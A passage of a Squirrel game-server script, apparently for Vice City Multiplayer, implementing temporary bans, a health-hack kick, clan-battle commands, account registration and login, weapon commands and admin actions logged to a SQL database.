    case 2: return RGB(100,149,237);
    case 3: return RGB(200,0,0);
    case 4: return RGB(23,135,34);
    case 5: return RGB(211,211,211);
    default: return RGB(255, 255, 255);
  }
}

function checkmaxdays(month)
{
	switch(month)
	{
		case 1:
			return 31;
			break;
		case 2:
			return 28;
			break;
		case 3:
			return 31;
			break;
		case 4:
			return 30;
			break;
		case 5:
			return 31;
			break;
		case 6:
			return 30;
			break;
		case 7:
			return 31;
			break;
		case 8:
			return 31;
			break;
		case 9:
			return 30;
			break;
		case 10:
			return 31;
			break;
		case 11:
			return 30;
			break;
		case 12:
			return 31;
			break;
	
		default: break;
	}
}
function addbantime(days)
{
	local now = date();
	local month = now.month,
	day = now.day,
	year = now.year,
	nmonth = checkmaxdays(month.tointeger()),
	ndays = day + days.tointeger();

	if(nmonth < ndays)
	{
		month++;
		ndays = ndays - 31;
		if(nmonth < ndays)
		{
			month++;
			ndays = ndays - 31;
		}
		if(nmonth < ndays)
		{
			month++;
			ndays = ndays - 31;
		}
		if(nmonth < ndays)
		{
			month++;
			ndays = ndays - 31;
		}
		if(month > 12)
		{
			year++;
			month = month - 12;
		}
		else
		{
			local dat = ndays + "/" + month + "/" + year + " " + now.hour + ":" + now.min + ":" + now.sec;
			return dat;
		}
	}
	else
	{
		local dat = ndays + "/" + month + "/" + year + " " + now.hour + ":" + now.min + ":" + now.sec;
		return dat;
	}
}


function checktempban(datetime)
{
	local now = date();
	local date = GetTok(datetime, " ", 1);
	local month = now.month,
	day = now.day,
	year = now.year,
	bday = GetTok(date, "/", 1).tointeger(),
	bmonth = GetTok(date, "/", 2).tointeger(),
	byear = GetTok(date, "/", 3).tointeger(),
	fday = bday - day,
	fmonth = bmonth - month,
	fyear = byear - year;

	if(fyear < 0) return 1;
	else if(fyear < 1 && fmonth < 0) return 1;
	else if(fmonth < 1 && fday < 0) return 1;
	else return 0;

	
	
}
function onPlayerHealthChange( player, lastHP, newHP )
{
	if(newHP > 100)
	{
		Message("[#FFDD33]Information:[#FFFFFF] Player:"+pcol(player.ID)+player.Name+white+" Kicked. Reason: Health Hack.");
		KickPlayer(player);
	}
}

function removetempban(uid)
{
	local q = QuerySQL(ban, "SELECT * FROM tempban WHERE UID = '"+uid+"'");
	if(q)
	{
		QuerySQL(DB, "UPDATE Accounts SET banned = 'No' WHERE LowerName = '"+GetSQLColumnData(q, 1)+"'");
		QuerySQL(ban, "INSERT INTO temunbanned (name, badmin, admin, duration, date, breason) VALUES ('"+GetSQLColumnData(q, 0)+"', '"+GetSQLColumnData(q, 1)+"', 'Server', '"+GetSQLColumnData(q, 4)+"', '"+GetSQLColumnData(q, 2)+"', '"+GetSQLColumnData(q, 6)+"') ");
		QuerySQL(ban, "DELETE FROM tempban WHERE UID = '"+uid+"'");
	}
}

function onPlayerEnterVehicle( player, veh, isPassenger )
{
	veh.Immunity = 255;
	if(status[player.ID].Level < 6)
	{
		if(status[player.ID].vehaccess != true) player.Eject();
		else
		{
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Vehicle ID:"+veh.ID+".", player);
		}
	}
	else
	{
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] Vehicle ID:"+veh.ID+".", player);
	}
}



















function onWorld2Command( player, command, arguments )
{
	local cmd, text;
	cmd = command.tolower();
	text = arguments;
	local params, playerName = pcol( player.ID ) + player.Name + white; 
		if( cmd == "selectsub" )
		{
			if( !arguments ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Use /"+ bas + cmd +" <player>", player );
			else if( CBattle.State == "OFF" || CBattle.State == "STARTED"  || CBattle.State == "PENDING" || CBattle.Sub_Process == false ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This command is no longer used in this current state.", player );
			else if( !status[ player.ID ].clan ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in a clan.", player );
			else if( status[ player.ID ].crank < 3 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] The leader has authorized permission to select your subboardinates.", player );
			else if( CBattle.TPlayers.find( player.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not a clan battle participant.", player );
			else
			{
				local cplr =  FindPlayer( arguments );
				if( !cplr || CBattle.TPlayers.find( cplr.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This player is not present in the clan battle.", player );
				else if( status[ cplr.ID ].clan != status[ player.ID ].clan ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] "+ pcol( cplr.ID ) + cplr.Name + white +" is not in your clan.", player );
				else if( CBattle.ClanPlayers_One.find( player.ID ) != null && CBattle.CPOSubs.find( cplr.ID ) != null || CBattle.ClanPlayers_Two.find( player.ID ) != null && CBattle.CPTSubs.find( cplr.ID ) != null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] "+ pcol( cplr.ID ) + cplr.Name + white +" is already a subboardinate.", player );
				else if( CBattle.ClanPlayers_One.find( player.ID ) != null && CBattle.CPOSubs.len() == 3 || CBattle.ClanPlayers_Two.find( player.ID ) != null && CBattle.CPTSubs.len() == 3 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You've already have 3 subboardinates in your clan.", player );
				else
				{
					if( CBattle.ClanPlayers_One.find( cplr.ID ) != null )
					{
						CBattle.ClanPlayers_One.remove( CBattle.ClanPlayers_One.find( cplr.ID ) );
						CBattle.CPOSubs.push( cplr.ID );
					}
					else if( CBattle.ClanPlayers_Two.find( cplr.ID ) != null )
					{
						CBattle.ClanPlayers_Two.remove( CBattle.ClanPlayers_Two.find( cplr.ID ) );
						CBattle.CPTSubs.push( cplr.ID );
					}
					for( local i = 0; i <= GetMaxPlayers(); i++ )
					{
						local plr = FindPlayer( i );
						if( ( plr ) && ( plr.World == 2 ) )
						{
							MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Clan Leader "+ playerName +" has chosen "+ pcol( cplr.ID ) + cplr.Name + white +" as a subboardinate.", plr );
							if( CBattle.CPOSubs.len() == 3 && CBattle.CPTSubs.len() == 3 )
							{
								MessagePlayer( "[#FFDD33]Information:[#FFFFFF] All subboardinates have been chosen; if you're ready to commence, use "+ bas + "/ready" + white +".", plr );
								CBattle.RProcess = true;
								CBattle.Sub_Process = false;
								continue;
							}
						}
					}		
				}
			}
		}
		else if( cmd == "ready" )
		{
			if( CBattle.State == "OFF" || CBattle.State == "STARTED" || CBattle.State == "PENDING" || CBattle.RProcess == false ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This command is no longer used in this current state.", player );
			else if( !status[ player.ID ].clan ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in a clan.", player );
			else if( CBattle.TPlayers.find( player.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not a clan battle participant.", player );
			else if( CBattle.CVD[ player.ID ] == true ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're already ready for combat.", player );
			else
			{
				CBattle.CV++;
				CBattle.CVD[ player.ID ] = true;
				for( local i = 0; i <= GetMaxPlayers(); i++ )
				{
					local plr = FindPlayer( i );
					if( ( plr ) && ( plr.World == 2 ) )
					{
						MessagePlayer( "[#FFDD33]Information:[#FFFFFF] "+ playerName +" is ready to commence in battle. ("+bas + CBattle.CV+"/16"+ white+")", plr );
						if( CBattle.CV == 16 ) MessagePlayer( "[#FFDD33]Information:[#FFFFFF] All votes has been casted. When the staff is ready, they'll use "+ bas + "/start" + white +" to begin the clan battle.", plr );
					}
				}
			}
		}
		else if( cmd == "start" )
		{
			if( CBattle.State == "OFF" || CBattle.State == "STARTED" || CBattle.RProcess == false || CBattle.CV < 16 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This command is no longer used in this current state.", player );
			else if( status[ player.ID ].Level < 4 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unauthorized access.", player );
			else if( CBattle.Staff.find( player.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in the clan battle.", player );
			else
			{
				for( local i = 0; i <= GetMaxPlayers(); i++ )
				{
					local plr = FindPlayer( i );
					if( ( plr ) && ( plr.World == 2 ) )
					{
						MessagePlayer( "[#FFDD33]Information:[#FFFFFF] "+ playerName +" has started the clan battle.", plr );
						plr.IsFrozen = true;
						CBattle.RProcess = false;
						CBattle.V = 0;
						CBattle.CV = 0;
						CBattle.CVD[ plr.ID ] = false;
					}
				}
				Message( "[#FFDD33]Information:[#FFFFFF] Dear audience, you can spectate the match using "+bas+"/joincb"+white+"!" );
				CBRStartCallTimer();
				CBattle.State = "STARTED";
			}
		}
		else if( cmd == "wep" || cmd == "we" )
		{
			if( !text ) return MessagePlayer( "[#FF0000]Error:[#FFFFFF] /"+cmd+" <wep 1> <wep 2> <...>", player );
			else
			{
				local params = split( text, " " ); 
				player.SetWeapon(0,0);
				local weapons; // Create a new null variable which will be holding the list of weapons player took.
				local b;
				b = 0;
				for( local i = 0; i <= params.len() - 1; i++ ) // since the 'len' returns value from 1 and array's starting value point is 0, we will use len() - 1 otherwise we'll receive an error.
				{
					if( !IsNum( params[i] ) && GetWeaponID( params[i]) && GetWeaponID( params[i]) > 0 && GetWeaponID( params[i]) <= 32 ) // if Name was specified. 
					{
						player.SetWeapon( GetWeaponID( params[i] ), 99999 ); // Get the weapon ID from its Name
						if( b == 0)
						{
							weapons = GetWeaponName( GetWeaponID( params[i]) ); // Add the weapon name to given weapon list
							b = b + 1;
						}
						else weapons = weapons + ", " + GetWeaponName( GetWeaponID( params[i] ) );
					}
					else if( IsNum( params[i] ) && params[i].tointeger() < 33 && params[i].tointeger() > 0  ) // if ID was specified
					{
						player.SetWeapon( params[i].tointeger(), 99999 ); // Then just give player that weapon
						weapons = GetWeaponName( params[i].tointeger() ); // Get the weapon name from the ID and add it.
						if( b == 0)
						{
							weapons = GetWeaponName( params[i].tointeger() ); // Add the weapon name to given weapon list
							b = b + 1;
						}
						else weapons = weapons + ", " + GetWeaponName( params[i].tointeger() );
						//MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You received the following weapon: "+weapons+".", player );
						//status[player.ID].wepcmd = true;
						//NewTimer( "wepcmdf", 1000, 1, player.ID );
					}
					else MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Invalid Weapon Name/ID", player ); // if the invalid ID/Name was given
				}
				if( weapons != null ) MessagePlayer("[#FFDD33]Information:[#FFFFFF] You received the following weps : "+weapons+".", player );
			}
		}	
		else if( cmd == "spawnwep")
		{
			if( !arguments ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Use /"+cmd+" [wep1] [wep2] [wep3] ...", player );
			else
			{
				for ( local i = 0 ; i <200 ; i++)
				{
					player.RemoveWeapon( i );
				}
				status[player.ID].spawnwep = arguments;
				local params = split( text, " " ); 
				player.SetWeapon(0,0);
				local weapons; // Create a new null variable which will be holding the list of weapons player took.
				local b;
				b = 0;
				for( local i = 0; i <= params.len() - 1; i++ ) // since the 'len' returns value from 1 and array's starting value point is 0, we will use len() - 1 otherwise we'll receive an error.
				{
					if( !IsNum( params[i] ) && GetWeaponID( params[i]) && GetWeaponID( params[i]) > 0 && GetWeaponID( params[i]) <= 32 ) // if Name was specified. 
					{
						player.SetWeapon( GetWeaponID( params[i] ), 99999 ); // Get the weapon ID from its Name
						if( b == 0)
						{
							weapons = GetWeaponName( GetWeaponID( params[i]) ); // Add the weapon name to given weapon list
							b = b + 1;
						}
						else weapons = weapons + ", " + GetWeaponName( GetWeaponID(params[i]) );
					}
					else if( IsNum( params[i] ) && params[i].tointeger() < 33 && params[i].tointeger() > 0  ) // if ID was specified
					{
						player.SetWeapon( params[i].tointeger(), 99999 ); // Then just give player that weapon
						weapons = GetWeaponName( params[i].tointeger() ); // Get the weapon name from the ID and add it.
						if( b == 0)
						{
							weapons = GetWeaponName( params[i].tointeger() ); // Add the weapon name to given weapon list
							b = b + 1;
						}
						else weapons = weapons + ", " + GetWeaponName( params[i].tointeger() );				
						//MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You received the following weapon: "+weapons+".", player );
						//status[player.ID].wepcmd = true;
						//NewTimer( "wepcmdf", 1000, 1, player.ID);

					}
					else MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Invalid Weapon Name/ID", player ); // if the invalid ID/Name was given
				}
				if( weapons != null) MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You received the following weps : "+weapons+".", player );
			}
		}
		else if( cmd == "leavecb" )
		{
			if( status[ player.ID ].Level < 4 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unauthorized access.", player );
			else if( player.World != 2 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in the clan battle.", player );
			else CBattle.PartCB( player, 0 );
		}
		else if( cmd == "cancelclanbattle" || cmd == "cancelcb" )
		{
			if( CBattle.State == "OFF" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This command is no longer used in this current state.", player );
			else if( status[ player.ID ].Level < 4 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unauthorized access.", player );
			else if( CBattle.Staff.find( player.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in the clan battle.", player );
			else
			{
				for( local i = 0; i <= GetMaxPlayers(); i++ )
				{
					local plr = FindPlayer( i );
					if( ( plr ) && ( plr.World == 2 ) )
					{
						plr.IsFrozen = false;
						plr.IsOnRadar = true;
						plr.World = 1;
						plr.Pos = CBattle.iData[ plr.ID ];	
					}
				}
				CBattle.State = "OFF";
				CBattle.ClanPlayers_One.clear();
				CBattle.ClanPlayers_Two.clear();
				if( CBattle.CPOSubs.len() > 0 ) CBattle.CPOSubs.clear();
				if( CBattle.CPTSubs.len() > 0 ) CBattle.CPTSubs.clear();
				CBattle.TPlayers.clear();
				CBattle.Staff.clear();
				if( CBattle.Spectators.len() > 0 ) CBattle.Spectators.clear();
				CBattle.adminrequest = null;
				CBattle.A = 1;
				CBattle.I = 0;
				CBattle.FC_Alive = 0;
				CBattle.SC_Alive = 0;
				CBattle.SC_Score = 0;
				CBattle.FC_Score = 0;
				CBattle.Round = 1;
				Message( "[#FFDD33]Information:[#FFFFFF] The clan battle between "+ CBattle.ClanTags[0] +" & "+ CBattle.ClanTags[1] +" has been officially canceled by "+ playerName +"." );
				CBattle.ClanTags.clear();
			}
		}
		else if( cmd == "callsub" )
		{
			if( !arguments || NumTok( arguments, " " ) < 2 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Use /"+ bas + cmd +" <subboardinate> <clan member (in combat)>", player );
			else if( CBattle.State == "ON" || CBattle.State == "PENDING" || CBattle.MatchEnded == false ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This command is no longer used in this current state.", player );
			else if( !status[ player.ID ].clan ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in a clan.", player );
			else if( status[ player.ID ].crank < 3 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] The leader has authorized permission to select your subboardinates.", player );
			else if( CBattle.TPlayers.find( player.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not a clan battle participant.", player );
			else
			{
					local sub = FindPlayer( GetTok( arguments, " ", 1 ) ), plr = FindPlayer( GetTok( arguments, " ", 2 ) );
					if( !sub || !plr || CBattle.TPlayers.find( sub.ID ) == null || CBattle.TPlayers.find( plr.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This player is not present in the clan battle.", player );
					else if( sub == plr ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] These players have to be different.", player );
					else if( CBattle.ClanPlayers_One.find( player.ID ) != null && CBattle.CPOSubs.find( sub.ID ) == null || CBattle.ClanPlayers_Two.find( player.ID ) && CBattle.CPTSubs.find( sub.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] "+ pcol( sub.ID ) + sub.Name + white +" isn't a subboardinate in your clan.", player );
					else if( CBattle.ClanPlayers_One.find( player.ID ) != null && CBattle.ClanPlayers_One.find( plr.ID ) == null || CBattle.ClanPlayers_Two.find( player.ID ) != null && CBattle.ClanPlayers_Two.find( plr.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] "+ pcol( plr.ID ) + plr.Name + white +" is not in your clan, in combat.", player );
					else if( CBattle.ClanPlayers_One.find( player.ID ) != null && CBattle.CPOSubs.find( plr.ID ) != null || CBattle.ClanPlayers_Two.find( player.ID ) && CBattle.CPTSubs.find( plr.ID ) != null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] "+ pcol( plr.ID ) + plr.Name + white +" is already a subboardinate in your clan.", player );
					else
					{
						if( CBattle.ClanPlayers_One.find( player.ID ) != null )
						{
							CBattle.CPOSubs.remove( CBattle.CPOSubs.find( sub.ID ) );
							CBattle.ClanPlayers_One.remove( CBattle.ClanPlayers_One.find( plr.ID ) );
							CBattle.CPOSubs.push( plr.ID );
							CBattle.ClanPlayers_One.push( sub.ID );
						}
						else if( CBattle.ClanPlayers_Two.find( player.ID ) != null )
						{
							CBattle.CPTSubs.remove( CBattle.CPTSubs.find( sub.ID ) );
							CBattle.ClanPlayers_Two.remove( CBattle.ClanPlayers_Two.find( plr.ID ) );
							CBattle.CPTSubs.push( plr.ID );
							CBattle.ClanPlayers_Two.push( sub.ID );
						}
						sub.Pos = plr.Pos;
						sub.Widescreen = true;
						sub.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						SetSpectators();
						for( local i = 0; i <= GetMaxPlayers(); i++ )
						{
							local plrs = FindPlayer( i );
							if( ( plrs ) && ( plrs.World == 2 ) ) MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Clan Leader "+ playerName +" has substituted clan member "+ pcol( plr.ID ) + plr.Name + white +" with clan subboardinate "+ pcol( sub.ID ) + sub.Name + white +", ready for combat.", plrs );
						}
					}
			}
		}
		else if( cmd == "clanbattlekick" || cmd == "cbkick" )
		{
			if( !arguments ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+white+" <player>", player );
			else if( CBattle.State == "OFF" ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This command is no longer used in this current state.", player );
			else if( status[ player.ID ].Level < 4 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] Unauthorized access.", player );
			else if( CBattle.Staff.find( player.ID ) == null ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're not in the clan battle.", player );
			else
			{
				local plr = FindPlayer( arguments );
				if( !plr || plr.World != 2 ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] This player is not present in the clan battle.", player );
				else if( plr == player ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You can't kick yourself out of the match.", player );
				else if( status[ plr.ID ].Level >= status[ player.ID ].Level ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You can't kick someone with a higher level than yourself.", player );
				else
				{
					Message( "[#FFDD33]Information:[#FFFFFF] "+ checklvl( status[ player.ID ].Level ) +" "+ playerName +" kicked "+ pcol( plr.ID ) + plr.Name + white +" out of the match." );
					CBattle.PartCB( plr, 0 );
				}
			}
		}
		else MessagePlayer( "[#FF0000]Error:[#FFFFFF] Limited commands are disabled in this world.", player );
}











function onPlayerCommand(player, command, arguments)
{
	if( player.World == 2 ) return onWorld2Command( player, command, arguments );

local cmd, text;
cmd = command.tolower();
text = arguments;
local params;

local playerName = pcol(player.ID) + player.Name + white;


	if(cmd == "register")
	{
		if(status[player.ID].Registered || status[player.ID].LoggedIn || status[player.ID].Level > 0) MessagePlayer("[#FF0000]Error:[#FFFFFF] Nick already Registered.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <password>", player);
		else if(arguments.len() < 4) MessagePlayer("[#FF0000]Error:[#FFFFFF] Password should contain atleast 4 characters.", player);
		else
		{
			RegisterPlayer(player.ID, arguments);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] You are now registered on the Server.", player);
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] AutoLogin is set to Yes by default. To turn it off use /"+bas+"autologin"+white+" (toggles Automatically) to turn it off", player);
		}
	}

	else if(cmd == "login")
	{
		if(!status[player.ID].Registered) MessagePlayer("[#FF0000]Error:[#FFFFFF] You are not registered.", player);
		else if(status[player.ID].LoggedIn) MessagePlayer("[#FF0000]Error:[#FFFFFF] Already Logged in.", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <password>", player);
		else
		{
			local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
			if(!q) MessagePlayer("[#FF0000]Error:[#FFFFFF] There is a problem with your account. Please Contact a developer of the server.", player)
			else
			{
				if(SHA256(arguments) != status[player.ID].pass) MessagePlayer("[#FF0000]Error:[#FFFFFF] Wrong Password.", player);
				else
				{
					status[player.ID].LoggedIn = true;
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] You are Logged in.", player);
				}
			}
		}
	}
	else if(cmd == "credits")
	{
		MessagePlayer("[#FFDD33]Information:[#FFFFFF] This Server is created by umar4911 and Tdz.Kurumi.", player);
	}

	else if(!status[player.ID].Registered)
	{
		MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to register first. Use /"+bas+"register", player);
	}
	else if(!status[player.ID].LoggedIn)
	{
		MessagePlayer("[#FF0000]Error:[#FFFFFF] You need to login first. Use /"+bas+"login", player);
	}
	
	else
	{

	if(cmd == "autologin")
	{
		local q = QuerySQL(DB, "SELECT * FROM Accounts WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
		if(q)
		{
			if(GetSQLColumnData(q, 7) == "true")
			{
				QuerySQL(DB, "UPDATE Accounts SET AutoLogin = 'false' WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have Disabled AutoLogin.", player);
			}
			else
			{
				QuerySQL(DB, "UPDATE Accounts SET AutoLogin = 'true' WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
				MessagePlayer("[#FFDD33]Information:[#FFFFFF] You have Enabled AutoLogin.", player);
			}
		}
	}
	
	else if(cmd == "changepass" || cmd == "changepassword")
	{
		if(!arguments || NumTok(arguments, " ") < 2 || GetTok(arguments, " ", 1) == null || GetTok(arguments, " ", 2) == null ) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <old password> <new password>", player);
		else if(GetTok(arguments, " ", 2).len() < 4) MessagePlayer("[#FF0000]Error:[#FFFFFF] New Password should contain atlest 4 characters.", player);
		else if(SHA256(GetTok(arguments, " ", 1)) != status[player.ID].pass) MessagePlayer("[#FF0000]Error:[#FFFFFF] Wrong Old Password entered.", player);
		else
		{
			status[player.ID].pass = SHA256(GetTok(arguments, " ", 2));
			QuerySQL(DB, "UPDATE Accounts SET Password = '"+status[player.ID].pass+"' WHERE LowerName = '"+escapeSQLString(player.Name.tolower())+"'");
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Your password has been updated.", player);
		}
	}

	
	else if( cmd == "wep" || cmd == "we" )
	{
		if( !text ) return MessagePlayer( "[#FF0000]Error:[#FFFFFF] /"+cmd+" <wep 1> <wep 2> <...>", player );
		else
		{
			local params = split( text, " " ); 
			player.SetWeapon(0,0);
			local weapons; // Create a new null variable which will be holding the list of weapons player took.
			local b;
			b = 0;
			for( local i = 0; i <= params.len() - 1; i++ ) // since the 'len' returns value from 1 and array's starting value point is 0, we will use len() - 1 otherwise we'll receive an error.
			{
				if( !IsNum( params[i] ) && GetWeaponID( params[i]) && GetWeaponID( params[i]) > 0 && GetWeaponID( params[i]) <= 32 ) // if Name was specified. 
				{
					player.SetWeapon( GetWeaponID( params[i] ), 99999 ); // Get the weapon ID from its Name
					if(b == 0)
					{
						weapons = GetWeaponName(GetWeaponID(params[i])); // Add the weapon name to given weapon list
						b=b+1;
					}
					else
					{
						weapons = weapons + ", " + GetWeaponName(GetWeaponID(params[i]));
					}

				}
	
				else if( IsNum( params[i] ) && params[i].tointeger() < 33 && params[i].tointeger() > 0  ) // if ID was specified
				{
					player.SetWeapon( params[i].tointeger(), 99999 ); // Then just give player that weapon
					weapons = GetWeaponName( params[i].tointeger() ); // Get the weapon name from the ID and add it.
					if(b == 0)
					{
						weapons = GetWeaponName( params[i].tointeger() ); // Add the weapon name to given weapon list
						b=b+1;
					}
					else
					{
						weapons = weapons + ", " + GetWeaponName( params[i].tointeger() );
					}

					

				}
				else MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Invalid Weapon Name/ID", player ); // if the invalid ID/Name was given
			}
			if(weapons != null) MessagePlayer("[#FFDD33]Information:[#FFFFFF] You received the following weps : "+weapons+".", player);
		}
	}

	
	
	
	
	else if(cmd == "spawnwep")
	{
		if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+cmd+" [wep1] [wep2] [wep3] ...", player);
		else
		{
			for (local i = 0 ; i <200 ; i++)
			{
				player.RemoveWeapon(i);
			}
			status[player.ID].spawnwep = arguments;
			local params = split( text, " " ); 
			player.SetWeapon(0,0);
			local weapons; // Create a new null variable which will be holding the list of weapons player took.
			local b;
			b = 0;
			for( local i = 0; i <= params.len() - 1; i++ ) // since the 'len' returns value from 1 and array's starting value point is 0, we will use len() - 1 otherwise we'll receive an error.
			{
				if( !IsNum( params[i] ) && GetWeaponID( params[i]) && GetWeaponID( params[i]) > 0 && GetWeaponID( params[i]) <= 32 ) // if Name was specified. 
				{
					player.SetWeapon( GetWeaponID( params[i] ), 99999 ); // Get the weapon ID from its Name
					if(b == 0)
					{
						weapons = GetWeaponName(GetWeaponID(params[i])); // Add the weapon name to given weapon list
						b=b+1;
					}
					else
					{
						weapons = weapons + ", " + GetWeaponName(GetWeaponID(params[i]));
					}

				}
	
				else if( IsNum( params[i] ) && params[i].tointeger() < 33 && params[i].tointeger() > 0  ) // if ID was specified
				{
					player.SetWeapon( params[i].tointeger(), 99999 ); // Then just give player that weapon
					weapons = GetWeaponName( params[i].tointeger() ); // Get the weapon name from the ID and add it.
					if(b == 0)
					{
						weapons = GetWeaponName( params[i].tointeger() ); // Add the weapon name to given weapon list
						b=b+1;
					}
					else
					{
						weapons = weapons + ", " + GetWeaponName( params[i].tointeger() );
					}
				}
				else MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Invalid Weapon Name/ID", player ); // if the invalid ID/Name was given
			}
			if(weapons != null) MessagePlayer("[#FFDD33]Information:[#FFFFFF] You received the following weps : "+weapons+".", player);
		}
	}

	else if(cmd == "sethealth" || cmd == "sethp")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <0-100>", player);
		else if(!IsNum(GetTok(arguments, " ", 2)) || GetTok(arguments, " ", 2).tointeger() < 0 || GetTok(arguments, " ", 2).tointeger() > 100) MessagePlayer("[#FF0000]Error:[#FFFFFF] Health must be in numbers and between 0-100", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				plr.Health = GetTok(arguments, " ", 2).tointeger();
				Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set hp of player: "+pcol(plr.ID)+ plr.Name + white+" to: "+GetTok(arguments, " ", 2)+".");
			}
		}
	}

	else if(cmd == "canattack")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player>", player);
		else
		{
			local plr = FindPlayer(arguments);
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				if(plr.CanAttack == true) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID) + plr.Name + white+" can attack.", player);
				else MessagePlayer("[#FFDD33]Information:[#FFFFFF] Player: "+pcol(plr.ID) + plr.Name + white+" Cannot Attack.", player);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );          
			}
		}
	}
	else if(cmd == "setattack")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else if(!arguments || NumTok(arguments, " ") < 2) MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /"+bas+cmd+" <player> <yes/no>", player);
		else
		{
			local plr = FindPlayer(GetTok(arguments, " ", 1));
			if(!plr) MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Player.", player);
			else
			{
				if(GetTok(arguments, " ", 2) == "yes")
				{
					plr.CanAttack = true;
					Message("[#FFDD00]Administrator Command:[#FFFFFF] Admin "+playerName+" set attack of player: "+pcol(plr.ID) + plr.Name + white+" to [#33CC33] True"+white+".");
					MessagePlayer("[#FFDD33]Information:[#FFFFFF] Now you can attack/DM.", plr);
                local today = date(), dat = today.month + "/" + today.day + "/" + today.year;
                    QuerySQL( DB, "INSERT INTO AdminLog ( Admin, Level, Player, Date, Command, Reason ) VALUES ( '"+ escapeSQLString( player.Name ) +"',  '"+ status[ player.ID ].Level +"', '"+ escapeSQLString( plr.Name ) +"', '"+ dat +"', '"+ cmd +"', '"+ NR +"' ) " );
				}
				else if(GetTok(arguments, " ", 2) == "no")
				{
					plr.CanAttack = false;
